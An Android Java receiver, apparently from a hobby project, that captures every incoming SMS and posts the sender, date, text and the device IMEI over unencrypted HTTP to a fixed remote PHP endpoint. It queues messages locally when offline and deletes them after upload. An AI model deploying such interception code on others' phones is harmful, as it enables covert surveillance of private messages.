package com.lukasz.smsr;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Created by Lukasz on 2018-05-22.
 */

public class SMSReceiver extends BroadcastReceiver {

    DBHelper dbHelper;
    Context context;
    private SimpleDateFormat parser = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        SmsMessage[] smsArray = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        dbHelper = new DBHelper(context);
        new SendMessages().execute(smsArray);
    }

    // Pobiera IMEI i SMSy z bazy danych oraz układa je w format do wysłania na serwer.
    private String getDBdata(String sms){
        String data="";
        SQLiteDatabase db = dbHelper.getReadableDatabase();
        Cursor imeiCursor = db.query(DBHelper.TABLE_IMEI, null, null, null, null, null, null, null);
        imeiCursor.moveToFirst();
        data = imeiCursor.getString(imeiCursor.getColumnIndex(DBHelper.COLUMN_IMEI));
        data +="@-;-@"+sms;
        Cursor messagesCursor = db.query(DBHelper.TABLE_MESSAGES, null, null, null, null, null, null, null);
        while(messagesCursor.moveToNext()){
            data +="@-;-@";
            data += messagesCursor.getString(messagesCursor.getColumnIndex(DBHelper.COLUMN_SENDER)) + "-;-";
            data += parser.format(new Date(messagesCursor.getLong(messagesCursor.getColumnIndex(DBHelper.COLUMN_DATE)))) + "-;-";
            data += messagesCursor.getString(messagesCursor.getColumnIndex(DBHelper.COLUMN_MESSAGE));
            String[] forDelete = {messagesCursor.getString(messagesCursor.getColumnIndex(DBHelper.COLUMN_ID))};
            db.delete(DBHelper.TABLE_MESSAGES, DBHelper.COLUMN_ID+" = ?", forDelete);
            }
        db.close();
        return data;
    }

    /*  Jeśli sms jest długi to przychodzi w kilku wiadomościach, dlatego podawana jest tablica smsów. Sender jest zawsze ten sam dlatego pobieram go z pierwszego SMSa.
        Później łączę wszystkie SMSy w jednego Stringa. Jeśli nie ma dostępu do internetu SMS zapisywane jest  w bazie. Jak jest internet to pobierane są wszystkie wiadomości z bazy
        i wysyłam je do serwera.
     */
    private class SendMessages extends AsyncTask<SmsMessage, Void, Void>{
        @Override
        protected Void doInBackground(SmsMessage... smsMessages) {
            String message = "";
            String sender = smsMessages[0].getOriginatingAddress();
            Date smsDate = new Date(smsMessages[0].getTimestampMillis());
            for(SmsMessage sms : smsMessages){
                message += sms.getMessageBody();
            }
            ConnectivityManager cm = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            // data = IMEI@-;-@message1@-;-@message2@-;-@message3...
            // message = sender-;-date-;-message
            if(activeNetwork != null && activeNetwork.isConnectedOrConnecting()){
                String sms = sender + "-;-" + parser.format(new Date(smsDate.getTime())) + "-;-" + message;
                String data = getDBdata(sms);
                System.out.println(data);
                try{
                    URL url = new URL("http://server1337.ugu.pl/SMSR-saveMessages.php");
                    HttpURLConnection connection = (HttpURLConnection)url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setDoOutput(true);
                    OutputStream stream = new BufferedOutputStream(connection.getOutputStream());
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(stream, "UTF-8"));
                    writer.write("data="+data);
                    writer.flush();
                    writer.close();
                    stream.close();
                    InputStream in = new BufferedInputStream(connection.getInputStream()); //bez otworzenia InputStream rekordy nie zpaisują się w bazie, nie sprawdzałem dlaczego
                    in.close();
                }catch (MalformedURLException e){
                    e.printStackTrace();
                }catch (IOException e){
                    e.printStackTrace();
                }

            }else{
                // nie ma neta, zapis sms do bazy
                SQLiteDatabase db = dbHelper.getWritableDatabase();
                ContentValues values = new ContentValues();
                values.put(DBHelper.COLUMN_DATE, smsDate.getTime());
                values.put(DBHelper.COLUMN_MESSAGE, message);
                values.put(DBHelper.COLUMN_SENDER, sender);
                db.insert(DBHelper.TABLE_MESSAGES, null, values);
            }
            return null;
        }
    }
}
